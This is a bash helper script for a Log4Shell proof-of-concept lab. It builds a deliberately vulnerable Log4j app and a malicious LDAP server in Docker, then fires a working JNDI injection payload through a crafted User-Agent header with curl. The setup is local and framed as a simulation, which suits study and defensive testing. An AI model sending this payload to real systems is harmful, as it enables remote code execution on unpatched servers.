#!/usr/bin/env bash

NC=$'\e[0m' # No Color
BOLD=$'\033[1m'
UNDERLINE=$'\033[4m'
RED=$'\e[31m'
GREEN=$'\e[32m'
BLUE=$'\e[34m'
ORANGE=$'\x1B[33m'

IMAGE="log4j-exploit-shell"

# Check Pre Conditions
function check_pre_conditions(){
    if ! [ -x "$(command -v docker)" ]; then
        echo 'Error: docker is not installed.' >&2
        echo 'Goto https://www.docker.com/products/docker-desktop'
        exit 1
    fi
    echo "Pre Condition Checks Passed"
}

# Raise Error
function raise_error(){
  echo -e "${BOLD}${RED}${1}${NC}" >&2
  exit 1
}

# POC Container 
function poc(){
  [ "$OS_ENV" != "container"  ]  || raise_error "Can Not Execute Inside Container"
  # check if the docker image exists - if not built it
  if [ $(docker images -a | grep -c $IMAGE ) != 1 ];then 
      docker build -t $IMAGE .
  fi
  docker run --rm -it -e OS_ENV=container \
      -p 8080:8080 \
      -p 8888:8888 \
      -p 1389:1389 \
      --name $IMAGE \
      $IMAGE 
}

# Build Java Apps
function build(){
  mvn -f log4j-exploit/pom.xml clean compile assembly:single
  mvn -f  jndi-exploit/pom.xml clean compile assembly:single
}

# Start Apps
function start(){
  nohup  java  -Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
        -jar log4j-exploit/target/log4j-exploit-1.0-SNAPSHOT-jar-with-dependencies.jar >> out.txt 2>&1 &
  echo -e "Log4j Vulnerable Apps Done"

  nohup  java  -jar jndi-exploit/target/jndi-exploit-1.0-SNAPSHOT-jar-with-dependencies.jar >> out.txt 2>&1 &
  echo -e "Malicious LDAP server for JNDI injection Attacks - Done"
}

# Tail Logs
function logs(){
  [ -f "out.txt" ] && tail -f out.txt
}

# Stop Apps
function stop(){
  pid="$(lsof -t -i:8080)"
  [ -n "$pid" ] && kill -9 "$pid"
  pid="$(lsof -t -i:1389)"
  [ -n "$pid" ] && kill -9 "$pid"
  clean
}

# Stop Apps and Clean Logs
function clean(){
  echo -e "Deleting $IMAGE "
  docker rmi $IMAGE
  rm -fr out.txt
}

# Exploit Vulnerability
function exploit(){
  if [ $(docker ps -a | grep -c "$IMAGE") != 1 ]; then 
    raise_error "$IMAGE not Running.\n${GREEN}Run -> ./assist.sh poc ${NC}"
  fi 
  host_ip="$(ifconfig | grep "inet " | grep -Fv 127.0.0.1 | awk '{print $2}')"
  id=$(docker ps -a | grep jndi-exploit | awk '{print $1}')
  if [ -n "$id" ];then
    echo "jndi-exploit container is $id"
    host_ip=$(docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$id")
  fi
  ua="User-Agent: \${jndi:ldap://$host_ip:1389/o=reference}"
  curl -v -H "$ua" "$host_ip:8080"
}

# Help 
function help(){
  if [ "$OS_ENV" != "container"  ];then 
      echo "Usage: $0  {poc | build | start | logs | exploit | stop}" >&2
      echo
      echo "   poc        -> poc container "
      echo "   exploit    -> Simulate Exploit"
      echo
  else
      echo "Usage: $0  {start | logs | exploit | stop}" >&2
      echo
      echo "   start      -> Start the Vulnerable App and Malicious JNDI Server  "
      echo "   logs       -> View Logs "
      echo "   stop       -> Stop teh Apps"
  fi 
  return 1
}

function main(){
  check_pre_conditions
  opt="$1"
  choice=$( tr '[:upper:]' '[:lower:]' <<<"$opt" )
  case $choice in
        poc) poc ;;
      build) build ;;
      start) start ;;
        ogs) logs ;;
    exploit) exploit ;;
       stop) stop ;;
      clean) clean ;;
          *)  help ;;
  esac
}

main "$@"

